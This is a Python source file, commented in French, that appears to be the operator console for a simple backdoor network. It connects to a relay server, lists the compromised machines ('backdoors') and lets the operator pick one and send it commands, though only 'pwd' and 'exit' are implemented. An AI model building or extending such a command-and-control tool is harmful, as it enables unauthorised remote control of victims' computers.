import socket
from function import *


ipServeur = 'localhost'
portServeur = 45 
#ipServeur = 'ip.ghmail.fr'
#portServeur = 500
listeCommande = ['exit','pwd']
listeBackdoor = {}

print("--------------------------------------")
print("                 CONSOLE              ")
print("--------------------------------------") 

def start():
    global listeBackdoor
    connexion_serveur = connexion()
    if connexion_serveur == None:
        print("Serveur introuvable")
        return None, None
    listeBackdoor, nbBackdoor = recupListeBackdoor(connexion_serveur)
    connexion_serveur.close()
    print("listeBackdoor = "+str(listeBackdoor))
    if listeBackdoor == {}:
        return None, None
    idMachineOk = False
    while idMachineOk != True:
        for k,v in listeBackdoor.items():
            print(str(k)+" : "+str(v))
        idMachine = input("Choisisez une machine a accéder avec son numéro: ")
        try:
            idMachine = int(idMachine)
            if idMachine > 0 and idMachine <= nbBackdoor:
                idMachineOk = True
            else:
                print("ID non valable")
        except:
            print("Valeur non valable")
    print("--------------------------------------")
    
    return True, idMachine


def main(idMachine):
    entree = input("> ")
    if entree in listeCommande:
        run = executeCommande(entree, idMachine)
        if run == False:
            return False

def connexion(s=0):
    try:
        connexion_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connexion_serveur.connect((ipServeur, portServeur))
        return connexion_serveur
    except:
        s += 1
        if s < 4:
            print("Erreur de connection au serveur")
            print("Nouvelle tentative")
            print('')
            return connexion(s)
        else:
            return None


def executeCommande(commande, idMachine):
    global listeBackdoor
    print(commande)
    if commande == 'exit':
        return False
    if commande == 'pwd':
        connexion_serveur = connexion()
        msgSend('pwd',connexion_serveur)
        msgRecv(connexion_serveur)
        msgSend(str(idMachine),connexion_serveur)
        connexion_serveur.close()
        connexion_serveur = connexion()
        listeBackdoor = recupListeBackdoor(connexion_serveur)
        connexion_serveur.close()

    return True



def recupListeBackdoor(connexion):
    dico = {}
    msgSend('listeBackdoor',connexion)
    nbBackdoor = int(msgRecv(connexion))
    if nbBackdoor > 0:
        for i in range(nbBackdoor):
            id = int(msgRecv(connexion))
            msgSend('none',connexion)
            nbElement = int(msgRecv(connexion))
            msgSend('none',connexion)
            liste = []
            for y in range(nbElement):
                e = msgRecv(connexion)
                liste.append(e)
            dico[id]=liste
        return dico, nbBackdoor
    else:
        print("Aucune backdoor disponible")
        input()
        return {}, 0


runAll = True
while runAll != False:
    startValide, idMachine = start()
    print("idMachine : "+str(idMachine))
    if startValide != None and idMachine != None:
        while True:
            runMain = main(idMachine)
            if runMain == False:
                break
    print("--------------------------------------")
